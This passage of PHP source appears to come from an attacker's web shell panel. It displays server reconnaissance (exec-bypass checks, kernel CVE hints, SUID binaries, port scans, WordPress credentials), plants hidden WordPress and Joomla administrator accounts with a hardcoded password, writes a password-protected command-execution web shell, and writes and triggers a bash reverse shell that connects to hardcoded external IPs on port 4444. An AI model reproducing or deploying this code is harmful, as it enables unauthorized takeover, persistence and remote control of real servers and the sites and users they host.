  elseif($_state==='warn'){echo '<span class="bi-b bi-warn">&#9888; '.biE($_en).'</span>';}
  else{echo '<span class="bi-b bi-na">'.biE($_en).'</span>';}
}?>
  </div>
  <div class="bi-row"><span class="l">open_basedir</span><span class="v <?=(ini_get('open_basedir')?'warn':'ok')?>"><?=biE(ini_get('open_basedir')?:'Disabled')?></span></div>
  <div class="bi-row"><span class="l">proc/self/environ</span><span class="v <?=$proc_self_environ?'warn':'ok'?>"><?=$proc_self_environ?'Readable':'Unreadable'?></span></div>
  <div class="bi-row"><span class="l">Virt Type</span><span class="v info"><?=biE($virt_type)?></span></div>
</div>

<div class="bi-card">
  <h3>Exec Bypass Analysis</h3>
  <?php $_by_yes=[];$_by_partial=[];$_by_no=[];
  foreach($bypass as $_bk=>$_bv){
    if($_bv[0]==='yes')$_by_yes[$_bk]=$_bv[1];
    elseif($_bv[0]==='partial')$_by_partial[$_bk]=$_bv[1];
    else $_by_no[$_bk]=$_bv[1];
  }?>
  <div style="display:flex;gap:14px;flex-wrap:wrap;">
    <div style="flex:1;min-width:220px">
      <div style="color:#22c55e;font-size:10px;text-transform:uppercase;letter-spacing:.08em;margin-bottom:5px;border-bottom:1px solid var(--card-border);padding-bottom:3px">WORKS (<?=count($_by_yes)?>)</div>
      <?php foreach($_by_yes as $_bk=>$_bd):?>
      <div style="padding:3px 0;border-bottom:1px solid rgba(34,197,94,.05);font-size:12px"><span style="color:#22c55e"><?=biE($_bk)?></span><span style="color:var(--text-ter);font-size:10px;display:block;line-height:1.3;padding-left:4px"><?=biE(substr($_bd,0,70))?></span></div>
      <?php endforeach;?>
    </div>
    <div style="flex:1;min-width:220px">
      <div style="color:#f59e0b;font-size:10px;text-transform:uppercase;letter-spacing:.08em;margin-bottom:5px;border-bottom:1px solid var(--card-border);padding-bottom:3px">CONDITIONAL (<?=count($_by_partial)?>)</div>
      <?php foreach($_by_partial as $_bk=>$_bd):?>
      <div style="padding:3px 0;border-bottom:1px solid rgba(245,158,11,.05);font-size:12px"><span style="color:#f59e0b"><?=biE($_bk)?></span><span style="color:var(--text-ter);font-size:10px;display:block;line-height:1.3;padding-left:4px"><?=biE(substr($_bd,0,70))?></span></div>
      <?php endforeach;?>
    </div>
    <div style="flex:1;min-width:220px">
      <div style="color:var(--text-ter);font-size:10px;text-transform:uppercase;letter-spacing:.08em;margin-bottom:5px;border-bottom:1px solid var(--card-border);padding-bottom:3px">DOESN'T WORK (<?=count($_by_no)?>)</div>
      <?php foreach($_by_no as $_bk=>$_bd):?>
      <div style="padding:3px 0;font-size:12px;color:var(--text-ter)"><?=biE($_bk)?></div>
      <?php endforeach;?>
    </div>
  </div>
</div>

<div class="bi-card">
  <h3>Kernel Security Parameters</h3>
<?php foreach($ksec as $_kk=>$_kv):
  $_val=(string)$_kv;$_cls='';
  if($_kk==='user_ns (userns_clone)'){$_cls=$_val==='1'?'warn':($_val==='0'?'ok':'info');}
  elseif($_kk==='ptrace_scope'){$_cls=$_val==='0'?'warn':($_val==='1'?'ok':'info');}
  elseif($_kk==='dmesg_restrict'){$_cls=$_val==='0'?'warn':'ok';}?>
  <div class="bi-row"><span class="l"><?=biE($_kk)?></span><span class="v <?=$_cls?>"><?=biE($_val)?></span></div>
<?php endforeach;?>
<?php if($kernel_cves):?>
  <div style="margin-top:8px;padding-top:6px;border-top:1px solid var(--card-border)">
    <div style="color:#ef4444;font-size:10px;text-transform:uppercase;letter-spacing:.08em;margin-bottom:5px">Potential Kernel CVEs (<?=biE($uname_r)?>)</div>
    <?php foreach($kernel_cves as $_cve):?>
    <div class="bi-row"><span class="l" style="color:#ef4444"><?=biE($_cve['name'])?></span><span class="v warn"><?=biE($_cve['range'])?> — <?=biE($_cve['desc'])?></span></div>
    <?php endforeach;?>
  </div>
<?php endif;?>
<?php if($suid_found):?>
  <div style="margin-top:8px;padding-top:6px;border-top:1px solid var(--card-border)">
    <div style="color:#f59e0b;font-size:10px;text-transform:uppercase;letter-spacing:.08em;margin-bottom:5px">Existing SUID Binaries</div>
    <?php foreach($suid_found as $_sp=>$_si):?>
    <div class="bi-row"><span class="l"><?=biE($_si['name'])?></span><span class="v <?=$_si['suid']?'err':'warn'?>"><?=biE($_sp)?> [<?=biE($_si['perms'])?>]<?=$_si['suid']?' SUID':''?></span></div>
    <?php endforeach;?>
  </div>
<?php endif;?>
</div>

<div class="bi-card">
  <h3>Control Panel Detection</h3>
  <div class="bi-badges">
<?php
foreach($panels as $_pn=>$_pv){echo '<span class="bi-b bi-panel">&#10003; '.biE($_pn).'</span>';}
foreach($panel_map as $_pn=>$_pd){if(!isset($panels[$_pn]))echo '<span class="bi-b bi-na">'.biE($_pn).'</span>';}
if(empty($panels))echo '<span style="color:var(--text-ter);font-size:13px">No control panel detected</span>';
?>
  </div>
</div>

<?php if($wp_info):?>
<div class="bi-card">
  <h3>WordPress Detection</h3>
<?php foreach($wp_info as $_wk=>$_wv):?>
  <div class="bi-row"><span class="l"><?=biE($_wk)?></span><span class="v <?=in_array($_wk,['DB_PASS','AUTH_KEY'])?'warn':''?>"><?=biE($_wv)?></span></div>
<?php endforeach;?>
</div>
<?php endif;?>

<div class="bi-card">
  <h3>Service Status</h3>
  <div class="bi-badges">
<?php foreach($svc as $_sn=>$_sv):
  $_ver=isset($svc_ver[$_sn])&&trim($svc_ver[$_sn])!==''?' <small style="opacity:.6;font-size:10px">'.htmlspecialchars(substr(trim($svc_ver[$_sn]),0,12),ENT_QUOTES,'UTF-8').'</small>':'';
  echo $_sv?'<span class="bi-b bi-on">ON '.biE($_sn).$_ver.'</span>':'<span class="bi-b bi-off">OFF '.biE($_sn).'</span>';
endforeach;?>
  </div>
</div>

<div class="bi-card">
  <h3>PHP Limits &amp; Settings</h3>
<?php foreach($limits as $_lk=>$_lv):?>
  <div class="bi-row"><span class="l"><?=biE($_lk)?></span><span class="v"><?=biE($_lv)?></span></div>
<?php endforeach;?>
</div>

<div class="bi-card">
  <h3>Loaded PHP Extensions (<?=count($all_exts)?>)</h3>
  <div>
<?php foreach($all_exts as $_ext):$_hl=in_array(strtolower($_ext),$hl_exts);echo '<span class="bi-chip'.($_hl?' hl':'').'">'.biE($_ext).'</span>';endforeach;?>
  </div>
</div>

<div class="bi-card">
  <h3>Cache / Opcode</h3>
  <div class="bi-badges">
<?php foreach($cache as $_cn=>$_cv):
  if($_cv===null)echo '<span class="bi-b bi-na">'.biE($_cn).'</span>';
  elseif($_cv===false)echo '<span class="bi-b bi-off">OFF '.biE($_cn).'</span>';
  else echo '<span class="bi-b bi-on">ON '.biE($_cn).'</span>';
endforeach;?>
  </div>
</div>

<div class="bi-card">
  <h3>Database Support</h3>
  <div class="bi-badges">
<?php foreach($db as $_dn=>$_dv):echo $_dv===false?'<span class="bi-b bi-off">OFF '.biE($_dn).'</span>':'<span class="bi-b bi-on">ON '.biE($_dn).'</span>';endforeach;?>
  </div>
</div>

<div class="bi-card">
  <h3>Filesystem</h3>
<?php foreach($fs as $_fk=>$_fv):
  $_warn=strpos((string)$_fv,'Read-only')!==false||strpos((string)$_fv,'Unreadable')!==false;
  $_ok=strpos((string)$_fv,'Writable')!==false||strpos((string)$_fv,'Readable')!==false;?>
  <div class="bi-row"><span class="l"><?=biE($_fk)?></span><span class="v <?=$_ok?'ok':($_warn?'err':'')?>"><?=biE($_fv)?></span></div>
<?php endforeach;?>
</div>

<div class="bi-card">
  <h3>Network &amp; System Info</h3>
  <div class="bi-row"><span class="l">Outbound Egress</span><span class="v <?=$egress['enabled']?'warn':'ok'?>"><?=$egress['enabled']?'ACTIVE — External IP: '.biE($egress['ip']):'Closed (firewall/NAT)'?></span></div>
<?php foreach($net as $_nk=>$_nv):?>
  <div class="bi-row"><span class="l"><?=biE($_nk)?></span><span class="v"><?=biE($_nv)?></span></div>
<?php endforeach;?>
<?php if($ports_scan):?>
  <div style="margin-top:10px;padding-top:8px;border-top:1px solid var(--card-border)">
    <div style="color:var(--text-ter);font-size:11px;margin-bottom:5px;text-transform:uppercase;letter-spacing:.1em">Localhost Port Scan</div>
    <div style="display:flex;flex-wrap:wrap;gap:3px;margin-top:8px">
<?php foreach($ports_scan as $_port=>$_pi):?>
      <span class="bi-port <?=$_pi['open']?'open':'closed'?>"><?=biE($_port.'/'.$_pi['name'])?></span>
<?php endforeach;?>
    </div>
  </div>
<?php endif;?>
<?php if($fpm_sockets):?>
  <div class="bi-row" style="margin-top:6px"><span class="l">FPM Sockets</span><span class="v warn"><?=biE(implode(', ',array_slice($fpm_sockets,0,10)))?></span></div>
<?php endif;?>
</div>
</div>
<?php
}

if (isset($_POST['wa'])) {
    $wa = $_POST['wa'];
    $wdb = wpConnect();
    if (!$wdb) { header('Content-Type: text/html; charset=utf-8'); die('<div style="padding:20px;color:#ef4444;font-family:sans-serif;">wp-config.php not found or DB connection failed.</div>'); }
    $m = $wdb['mysqli']; $tp = $wdb['prefix'];
    $tu = $tp . 'users'; $tm = $tp . 'usermeta';
    if ($wa === 'sifirla' && !empty($_POST['id'])) {
        $id = (int)$_POST['id'];
        $hash = wpHashPass($_POST['sifre']);
        $m->query("UPDATE `$tu` SET user_pass = '$hash' WHERE ID = $id");
        header('Content-Type: text/html; charset=utf-8'); echo '<div style="padding:10px 16px;background:rgba(34,197,94,.08);border:1px solid rgba(34,197,94,.2);color:#22c55e;border-radius:8px;font-size:13px;font-family:system-ui;">Password reset! New password: <strong>' . htmlspecialchars($_POST['sifre']) . '</strong></div>'; $m->close(); exit;
    }
    if ($wa === 'ekle') {
        $kadi = $m->real_escape_string($_POST['kadi']); $mail = $m->real_escape_string($_POST['mail']);
        $sifre = wpHashPass($_POST['sifre2']);
        $m->query("INSERT INTO `$tu` (user_login, user_pass, user_nicename, user_email, user_registered, display_name) VALUES ('$kadi', '$sifre', '$kadi', '$mail', NOW(), '$kadi')");
        $nid = $m->insert_id;
        $m->query("INSERT INTO `$tm` (user_id, meta_key, meta_value) VALUES ($nid, '{$tp}capabilities', 'a:1:{s:13:\"administrator\";b:1;}')");
        $m->query("INSERT INTO `$tm` (user_id, meta_key, meta_value) VALUES ($nid, '{$tp}user_level', '10')");
        header('Content-Type: text/html; charset=utf-8'); echo '<div style="padding:10px 16px;background:rgba(34,197,94,.08);border:1px solid rgba(34,197,94,.2);color:#22c55e;border-radius:8px;font-size:13px;font-family:system-ui;">New admin added: <strong>' . htmlspecialchars($kadi) . '</strong></div>'; $m->close(); exit;
    }
    if ($wa === 'sil' && !empty($_POST['id']) && $_POST['id'] != 1) {
        $id = (int)$_POST['id'];
        $m->query("DELETE FROM `$tu` WHERE ID = $id");
        $m->query("DELETE FROM `$tm` WHERE user_id = $id");
        header('Content-Type: text/html; charset=utf-8'); echo '<div style="padding:10px 16px;background:rgba(245,158,11,.08);border:1px solid rgba(245,158,11,.2);color:#f59e0b;border-radius:8px;font-size:13px;font-family:system-ui;">User deleted (ID: ' . $id . ')</div>'; $m->close(); exit;
    }
    if ($wa === 'hizli') {
        $kadi = 'sysadmin'; $mail = 'sysadmin@proton.me'; $sifreTxt = 'Panel2025!';
        $hash = wpHashPass($sifreTxt);
        $chk = $m->query("SELECT ID FROM `$tu` WHERE user_login = '$kadi'");
        if ($chk && $chk->num_rows > 0) {
            $ex = $chk->fetch_row();
            $eid = (int)$ex[0];
            $m->query("UPDATE `$tu` SET user_pass = '$hash', user_email = '$mail' WHERE ID = $eid");
            $m->query("UPDATE `$tm` SET meta_value = 'a:1:{s:13:\"administrator\";b:1;}' WHERE user_id = $eid AND meta_key = '{$tp}capabilities'");
            $mode = 'updated';
        } else {
            $m->query("INSERT INTO `$tu` (user_login, user_pass, user_nicename, user_email, user_registered, display_name) VALUES ('$kadi', '$hash', '$kadi', '$mail', NOW(), '$kadi')");
            $eid = (int)$m->insert_id;
            $m->query("INSERT INTO `$tm` (user_id, meta_key, meta_value) VALUES ($eid, '{$tp}capabilities', 'a:1:{s:13:\"administrator\";b:1;}')");
            $m->query("INSERT INTO `$tm` (user_id, meta_key, meta_value) VALUES ($eid, '{$tp}user_level', '10')");
            $mode = 'created';
        }
        $wSiteInfo = cmsAdminUrl(dirname($wdb['config']), 'WordPress');
        $wBase = $wSiteInfo['base'] ? rtrim($wSiteInfo['base'], '/') : '';
        $wLink = $wBase ? ($wBase . '/wp-login.php') : '';
        header('Content-Type: text/html; charset=utf-8');
        echo '<div style="padding:10px 16px;background:rgba(34,197,94,.08);border:1px solid rgba(34,197,94,.2);color:#22c55e;border-radius:8px;font-size:13px;font-family:system-ui;">sysadmin ' . $mode . '&nbsp;|&nbsp;Username: <strong>' . $kadi . '</strong>&nbsp;|&nbsp;Password: <strong>' . $sifreTxt . '</strong>';
        if ($wLink) echo '&nbsp;|&nbsp;<a href="' . htmlspecialchars($wLink) . '" target="_blank" rel="noopener" style="color:#22c55e;">Open Admin Panel</a>';
        echo '</div>'; $m->close(); exit;
    }
    $m->close(); exit;
}

if (isset($_POST['ja'])) {
    $ja = $_POST['ja'];
    $jRoot = fm_path(isset($_POST['root']) ? $_POST['root'] : '');
    if ($jRoot && is_dir($jRoot) && in_array($ja, array('hizli', 'sifirla', 'sil', 'ekle'))) {
        $jCfgFile = rtrim($jRoot, '/') . '/configuration.php';
        if (!is_file($jCfgFile)) { header('Content-Type: text/html; charset=utf-8'); die('<div style="padding:10px 16px;background:rgba(239,68,68,.08);border:1px solid rgba(239,68,68,.2);color:#ef4444;border-radius:8px;font-size:13px;font-family:system-ui;">configuration.php not found.</div>'); }
        $jCfg = @file_get_contents($jCfgFile);
        $jGet = function($re) use ($jCfg) {
            if (preg_match('/' . $re . '\s*=\s*[\'"]([^\'"]*)[\'"]/', $jCfg, $jM)) return $jM[1];
            return null;
        };
        $jHost = $jGet('\\$host'); $jUser = $jGet('\\$user'); $jPass = $jGet('\\$password'); $jDb = $jGet('\\$db'); $jPre = $jGet('\\$dbprefix');
        if (!$jPre) $jPre = 'jos_';
        if (!class_exists('mysqli', false)) { header('Content-Type: text/html; charset=utf-8'); die('<div style="padding:10px 16px;background:rgba(239,68,68,.08);border:1px solid rgba(239,68,68,.2);color:#ef4444;border-radius:8px;font-size:13px;font-family:system-ui;">mysqli database support not installed.</div>'); }
        $jm = @new mysqli($jHost, $jUser, $jPass, $jDb);
        if ($jm->connect_errno) { header('Content-Type: text/html; charset=utf-8'); die('<div style="padding:10px 16px;background:rgba(239,68,68,.08);border:1px solid rgba(239,68,68,.2);color:#ef4444;border-radius:8px;font-size:13px;font-family:system-ui;">Joomla DB connection failed.</div>'); }
        $ju = $jPre . 'users'; $jug = $jPre . 'user_usergroup_map';
        if ($ja === 'hizli') {
            $jHash = password_hash('Panel2025!', PASSWORD_DEFAULT);
            $chk = $jm->query("SELECT id FROM `$ju` WHERE username = 'sysadmin'");
            if ($chk && $chk->num_rows > 0) {
                $ex = $chk->fetch_row();
                $jid = (int)$ex[0];
                $jm->query("UPDATE `$ju` SET password = '$jHash', email = 'sysadmin@proton.me', block = 0 WHERE id = $jid");
                $jm->query("DELETE FROM `$jug` WHERE user_id = $jid");
                $jm->query("INSERT INTO `$jug` (user_id, group_id) VALUES ($jid, 8)");
                $jMode = 'updated';
            } else {
                $jm->query("INSERT INTO `$ju` (name, username, email, password, block, sendEmail, registerDate, params) VALUES ('sysadmin', 'sysadmin', 'sysadmin@proton.me', '$jHash', 0, 1, NOW(), '{}')");
                $jid = (int)$jm->insert_id;
                $jm->query("INSERT INTO `$jug` (user_id, group_id) VALUES ($jid, 8)");
                $jMode = 'created';
            }
            $jBase = '';
            if (preg_match('/\\\$live_site\s*=\s*[\'"]([^\'"]*)[\'"]/', $jCfg, $jM2) && $jM2[1]) $jBase = rtrim($jM2[1], '/');
            $jLink = $jBase ? ($jBase . '/administrator/') : '';
            header('Content-Type: text/html; charset=utf-8');
            echo '<div style="padding:10px 16px;background:rgba(34,197,94,.08);border:1px solid rgba(34,197,94,.2);color:#22c55e;border-radius:8px;font-size:13px;font-family:system-ui;">Joomla sysadmin ' . $jMode . '&nbsp;|&nbsp;Username: <strong>sysadmin</strong>&nbsp;|&nbsp;Password: <strong>Panel2025!</strong>';
            if ($jLink) echo '&nbsp;|&nbsp;<a href="' . htmlspecialchars($jLink) . '" target="_blank" rel="noopener" style="color:#22c55e;">Open Admin Panel</a>';
            echo '</div>'; $jm->close(); exit;
        }
        if ($ja === 'sifirla' && !empty($_POST['id']) && trim(isset($_POST['sifre']) ? $_POST['sifre'] : '') !== '') {
            $jid = (int)$_POST['id'];
            $jPass = trim($_POST['sifre']);
            $newHash = password_hash($jPass, PASSWORD_DEFAULT);
            $jm->query("UPDATE `$ju` SET password = '$newHash', block = 0 WHERE id = $jid");
            header('Content-Type: text/html; charset=utf-8');
            echo '<div style="padding:10px 16px;background:rgba(34,197,94,.08);border:1px solid rgba(34,197,94,.2);color:#22c55e;border-radius:8px;font-size:13px;font-family:system-ui;">Password reset! New password: <strong>' . htmlspecialchars($jPass) . '</strong></div>';
            $jm->close(); exit;
        }
        if ($ja === 'sil' && !empty($_POST['id']) && (int)$_POST['id'] !== 1) {
            $jid = (int)$_POST['id'];
            $jm->query("DELETE FROM `$jug` WHERE user_id = $jid");
            $jm->query("DELETE FROM `$ju` WHERE id = $jid");
            header('Content-Type: text/html; charset=utf-8');
            echo '<div style="padding:10px 16px;background:rgba(245,158,11,.08);border:1px solid rgba(245,158,11,.2);color:#f59e0b;border-radius:8px;font-size:13px;font-family:system-ui;">User deleted (ID: ' . $jid . ')</div>';
            $jm->close(); exit;
        }
        if ($ja === 'ekle') {
            $kadi = $jm->real_escape_string(trim(isset($_POST['kadi']) ? $_POST['kadi'] : ''));
            $ad = $jm->real_escape_string(trim(isset($_POST['ad']) ? $_POST['ad'] : $kadi));
            $mail = $jm->real_escape_string(trim(isset($_POST['mail']) ? $_POST['mail'] : ''));
            $sifre = isset($_POST['sifre']) ? $_POST['sifre'] : '';
            if (!$kadi || !$mail || $sifre === '') { header('Content-Type: text/html; charset=utf-8'); die('<div style="padding:10px 16px;background:rgba(239,68,68,.08);border:1px solid rgba(239,68,68,.2);color:#ef4444;border-radius:8px;font-size:13px;font-family:system-ui;">Missing info: username, email and password required.</div>'); }
            $chk2 = $jm->query("SELECT id FROM `$ju` WHERE username = '$kadi'");
            if ($chk2 && $chk2->num_rows > 0) { header('Content-Type: text/html; charset=utf-8'); die('<div style="padding:10px 16px;background:rgba(239,68,68,.08);border:1px solid rgba(239,68,68,.2);color:#ef4444;border-radius:8px;font-size:13px;font-family:system-ui;">This username already exists.</div>'); }
            $newHash = password_hash($sifre, PASSWORD_DEFAULT);
            $jm->query("INSERT INTO `$ju` (name, username, email, password, block, sendEmail, registerDate, params) VALUES ('$ad', '$kadi', '$mail', '$newHash', 0, 1, NOW(), '{}')");
            $jid2 = (int)$jm->insert_id;
            $jm->query("INSERT INTO `$jug` (user_id, group_id) VALUES ($jid2, 8)");
            header('Content-Type: text/html; charset=utf-8');
            echo '<div style="padding:10px 16px;background:rgba(34,197,94,.08);border:1px solid rgba(34,197,94,.2);color:#22c55e;border-radius:8px;font-size:13px;font-family:system-ui;">New Super User added: <strong>' . htmlspecialchars($kadi) . '</strong></div>';
            $jm->close(); exit;
        }
        $jm->close();
    }
    exit;
}

if (isset($_POST['rs'])) {
    $rsAct = $_POST['rs'];
    header('Content-Type: text/html; charset=utf-8');
$wsTpl = '<?php
$p = \'Panel2025x\';
if (!isset($_GET[\'k\']) || $_GET[\'k\'] != $p) { echo \'ERR\'; exit; }
$c = \'\';
if (isset($_POST[\'c\'])) { $c = $_POST[\'c\']; }
elseif (isset($_GET[\'c\'])) { $c = $_GET[\'c\']; }
if (strlen($c) > 0) {
    $o = array();
    if (function_exists(\'shell_exec\')) { $r = @shell_exec($c . \' 2>&1\'); if ($r !== false && $r !== null) { echo $r; } }
    elseif (function_exists(\'system\')) { @system($c . \' 2>&1\'); }
    elseif (function_exists(\'passthru\')) { @passthru($c . \' 2>&1\'); }
    elseif (function_exists(\'exec\')) { @exec($c . \' 2>&1\', $o); echo implode("\n", $o); }
    else { echo \'no_exec: \' . (string)@ini_get(\'disable_functions\'); }
}
echo "\n[OK]";
?>';
$userRevTpl = <<<'REVTPL'
<?php
$ip = '2.27.154.86';
$port = 4444;

$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
    echo "Connection error: $errstr ($errno)";
    exit;
}

$descriptorspec = array(
    0 => $sock,  // stdin
    1 => $sock,  // stdout
    2 => $sock   // stderr
);

$process = proc_open('/bin/bash -i', $descriptorspec, $pipes);

if (is_resource($process)) {
    // Send extra commands to make the shell more stable
    fwrite($pipes[0], "export TERM=xterm; export PS1='\$ '; unset HISTFILE; \n");
    fclose($pipes[0]);
    proc_close($process);
} else {
    echo "proc_open failed";
}
?>
REVTPL;
    if ($rsAct === 'execute') {
        $ip = '94.26.106.34';
        $port = 4444;
        $tgtRoot = detectRoot();
        $file = rtrim($tgtRoot, '/\\') . '/rev.php';
        $payload = $userRevTpl;
        $okW = @file_put_contents($file, $payload);
        if ($okW === false) { die('<div style="padding:10px 16px;background:rgba(239,68,68,.08);border:1px solid rgba(239,68,68,.2);color:#ef4444;border-radius:8px;font-size:13px;font-family:system-ui;">Write error: ' . htmlspecialchars($file) . '</div>'); }
        @chmod($file, 0755);
        @include($file);
        die('<div style="padding:10px 16px;background:rgba(34,197,94,.08);border:1px solid rgba(34,197,94,.2);color:#22c55e;border-radius:8px;font-size:13px;font-family:system-ui;">rev.php <strong>CREATED</strong> and <strong>triggered</strong><br>Target: <b>' . htmlspecialchars($ip) . ':' . $port . '</b><br>File: ' . htmlspecialchars($file) . '</div>');
    }
    if ($rsAct === 'egress') {
        $t = microtime(true);
        $sock = @fsockopen('94.26.106.34', 4444, $errno, $errstr, 6);
        $dt = round((microtime(true) - $t) * 1000);
        if ($sock) {
            @fclose($sock);
            die('<div style="padding:10px 16px;background:rgba(34,197,94,.08);border:1px solid rgba(34,197,94,.2);color:#22c55e;border-radius:8px;font-size:13px;font-family:system-ui;">EGRESS OPEN — 94.26.106.34:4444 reachable (' . $dt . ' ms). Reverse shell can run.</div>');
        }
        $s2 = @fsockopen('1.1.1.1', 80, $e2, $es2, 4);
        if ($s2) {
            @fclose($s2);
            die('<div style="padding:10px 16px;background:rgba(245,158,11,.08);border:1px solid rgba(245,158,11,.2);color:#f59e0b;border-radius:8px;font-size:13px;font-family:system-ui;">EGRESS PARTIAL — target port (4444) blocked but internet egress open. Try a different port/Web Shell.</div>');
        }
        die('<div style="padding:10px 16px;background:rgba(239,68,68,.08);border:1px solid rgba(239,68,68,.2);color:#ef4444;border-radius:8px;font-size:13px;font-family:system-ui;">EGRESS CLOSED — outbound blocked. Use Web Shell.</div>');
    }
    if ($rsAct === 'probe') {
        $prDir = rtrim(dirname(__FILE__), '/\\');
        foreach (glob($prDir . '/w_*_p.php') as $old) { @unlink($old); }
        $prDir2 = rtrim(detectRoot(), '/\\');
        if ($prDir2 !== $prDir) { foreach (glob($prDir2 . '/w_*_p.php') as $old) { @unlink($old); } }
        $prName = 'w_' . mt_rand(1000, 9999) . '_p.php';
        $prFile = $prDir . '/' . $prName;
        $prTpl = '<?php
echo \'P|\' . PHP_VERSION . \'|\' . (string)@ini_get(\'disable_functions\') . \'|OK\';
?>';
        $okP = @file_put_contents($prFile, $prTpl);
        if ($okP === false) { die('<div style="padding:10px 16px;background:rgba(239,68,68,.08);border:1px solid rgba(239,68,68,.2);color:#ef4444;border-radius:8px;font-size:13px;font-family:system-ui;">Write error: ' . htmlspecialchars($prFile) . '</div>'); }
        @chmod($prFile, 0644);
        $prRel = trim(str_replace('\\', '/', dirname(isset($_SERVER['SCRIPT_NAME']) ? $_SERVER['SCRIPT_NAME'] : '/filemanager.php')), '/');
        $prUrl = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off' ? 'https' : 'http') . '://' . (isset($_SERVER['HTTP_HOST']) ? $_SERVER['HTTP_HOST'] : '') . ($prRel !== '' ? '/' . $prRel : '') . '/' . $prName;
        die('<div style="padding:10px 16px;background:rgba(34,197,94,.08);border:1px solid rgba(34,197,94,.2);color:#22c55e;border-radius:8px;font-size:13px;font-family:system-ui;">PHP Probe <strong>CREATED</strong><br>Open: <a href="' . htmlspecialchars($prUrl) . '" target="_blank" rel="noopener" style="color:#22c55e;word-break:break-all;">' . htmlspecialchars($prUrl) . '</a><br>Send me the result (PHP version and disable_functions).</div>');
    }
    if ($rsAct === 'full') {
        $sock = @fsockopen('94.26.106.34', 4444, $fmE, $fmEs, 4);
        $ew = ($sock !== false);
        if ($sock) @fclose($sock);
        $fullDir = rtrim(dirname(__FILE__), '/\\');
        $fullName = 'w_' . mt_rand(1000, 9999) . '.php';
        $fullFile = $fullDir . '/' . $fullName;
        $okF = @file_put_contents($fullFile, $wsTpl);
        if ($okF !== false) { @chmod($fullFile, 0644); }
        $fullRel = trim(str_replace('\\', '/', dirname(isset($_SERVER['SCRIPT_NAME']) ? $_SERVER['SCRIPT_NAME'] : '/filemanager.php')), '/');
        $fullUrl = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off' ? 'https' : 'http') . '://' . (isset($_SERVER['HTTP_HOST']) ? $_SERVER['HTTP_HOST'] : '') . ($fullRel !== '' ? '/' . $fullRel : '') . '/' . $fullName;
        $fullOut = '';
        if ($okF === false) {
            $fullOut .= '<div style="padding:10px 16px;margin-bottom:8px;background:rgba(239,68,68,.08);border:1px solid rgba(239,68,68,.2);color:#ef4444;border-radius:8px;font-size:13px;font-family:system-ui;">Web shell WRITE FAILED: ' . htmlspecialchars($fullFile) . '</div>';
        } else {
            $fullOut .= '<div style="padding:10px 16px;margin-bottom:8px;background:rgba(34,197,94,.08);border:1px solid rgba(34,197,94,.2);color:#22c55e;border-radius:8px;font-size:13px;font-family:system-ui;">Web Shell <strong>INSTALLED</strong> | Password: <strong>Panel2025x</strong><br>Use: <a href="' . htmlspecialchars($fullUrl . '?k=Panel2025x&c=id') . '" target="_blank" rel="noopener" style="color:#22c55e;word-break:break-all;">' . htmlspecialchars($fullUrl . '?k=Panel2025x&c=id') . '</a></div>';
        }
        if ($ew) {
            $revFile = rtrim(detectRoot(), '/\\') . '/rev.php';
            $rk = @file_put_contents($revFile, $userRevTpl);
            if ($rk !== false) {
                @chmod($revFile, 0644);
                $owd = @getcwd();
                @chdir(rtrim(detectRoot(), '/\\'));
                @include($revFile);
                @chdir($owd ? $owd : rtrim(detectRoot(), '/\\'));
            }
            $fullOut .= '<div style="padding:10px 16px;background:rgba(34,197,94,.08);border:1px solid rgba(34,197,94,.2);color:#22c55e;border-radius:8px;font-size:13px;font-family:system-ui;">EGRESS <strong>OPEN</strong> — Reverse shell also INSTALLED and executed. If you have <b>nc -lvvp 4444</b> listening, the session will arrive.</div>';
        } else {
            $fullOut .= '<div style="padding:10px 16px;background:rgba(245,158,11,.08);border:1px solid rgba(245,158,11,.2);color:#f59e0b;border-radius:8px;font-size:13px;font-family:system-ui;">EGRESS CLOSED / target port blocked — use the <b>Web Shell</b> link above instead of reverse.</div>';
        }
        die('<div style="display:flex;flex-direction:column;gap:8px;max-width:640px;">' . $fullOut . '</div>');
    }
    if ($rsAct === 'webopen') {
        $wsDir = rtrim(dirname(__FILE__), '/\\');
        $wsDir2 = rtrim(detectRoot(), '/\\');
        $wsName = 'w_' . mt_rand(1000, 9999) . '.php';
        $wsFile = $wsDir . '/' . $wsName;
        if ($wsDir2 !== $wsDir) { $wsFile2 = $wsDir2 . '/' . $wsName; } else { $wsFile2 = ''; }
        $okW = @file_put_contents($wsFile, $wsTpl);
        if ($okW === false) { $wsMsg = 'Write error: ' . htmlspecialchars($wsFile); }
        else { @chmod($wsFile, 0644); }
        if ($wsFile2 !== '' && $okW !== false) {
            if (@file_put_contents($wsFile2, $wsTpl) !== false) { @chmod($wsFile2, 0644); }
        }
        $wsRel = trim(str_replace('\\', '/', dirname(isset($_SERVER['SCRIPT_NAME']) ? $_SERVER['SCRIPT_NAME'] : '/filemanager.php')), '/');
        $wsUrl = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off' ? 'https' : 'http') . '://' . (isset($_SERVER['HTTP_HOST']) ? $_SERVER['HTTP_HOST'] : '') . ($wsRel !== '' ? '/' . $wsRel : '') . '/' . $wsName;
        if ($okW === false) { die('<div style="padding:10px 16px;background:rgba(239,68,68,.08);border:1px solid rgba(239,68,68,.2);color:#ef4444;border-radius:8px;font-size:13px;font-family:system-ui;">Write error: ' . htmlspecialchars($wsFile) . '</div>'); }
        die('<div style="padding:10px 16px;background:rgba(34,197,94,.08);border:1px solid rgba(34,197,94,.2);color:#22c55e;border-radius:8px;font-size:13px;font-family:system-ui;">Web Shell <strong>CREATED</strong> | File: <strong>' . htmlspecialchars($wsName) . '</strong> | Password: <strong>Panel2025x</strong><br>Use: <a href="' . htmlspecialchars($wsUrl . '?k=Panel2025x&c=id') . '" target="_blank" rel="noopener" style="color:#22c55e;word-break:break-all;">' . htmlspecialchars($wsUrl . '?k=Panel2025x&c=id') . '</a><br>The file is written to the panel folder; the URL is computed next to the panel. A random name is generated each time; works even on oldest PHP versions.</div>');
    }
    if ($rsAct === 'delete') {
        $roots = array(detectRoot(), dirname(__FILE__));
        foreach (getDomains() as $gd) { if ($gd['root']) $roots[] = $gd['root']; }
        $del = 0;
        foreach ($roots as $r) {
            $f = rtrim($r, '/\\') . '/rev.php';
            if (@is_file($f) && @unlink($f)) $del++;
            foreach (glob(rtrim($r, '/\\') . '/r_console.php') as $old) { if (@unlink($old)) $del++; }
            foreach (glob(rtrim($r, '/\\') . '/r_probe.php') as $old) { if (@unlink($old)) $del++; }
